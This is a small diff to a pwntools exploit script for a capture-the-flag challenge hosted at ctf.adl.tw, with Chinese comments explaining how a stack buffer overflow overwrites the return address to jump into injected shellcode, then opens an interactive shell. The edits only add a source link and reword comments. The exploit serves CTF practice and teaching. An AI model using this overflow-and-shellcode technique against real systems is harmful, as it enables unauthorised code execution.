@@ -1,3 +1,4 @@
+# https://ithelp.ithome.com.tw/articles/10188599
 from pwn import *
 
 ip = 'ctf.adl.tw'
@@ -13,9 +14,9 @@ shellcode += "a" * (120 - len(shellcode))
 address = r.recv()
 print("address: " + address)
 
-# 因為 overflow 部分會繼續被寫入記憶體，最終覆蓋到記憶體中的 return address
-# 當程式執行完畢 return 時會被導向 buffer 的記憶體位址，執行一開始植入的 shellcode
-shellcode += p64(int(address.decode(),16))
+# overflow 的部分會被寫入記憶體，覆蓋掉記憶體中的 return address
+# 當程式執行完畢 return 時會被重新指回 buffer 的記憶體位址，執行一開始植入的 shellcode
+shellcode += p64(int(address.decode(), 16))
 
 r.send(shellcode)
 r.interactive()
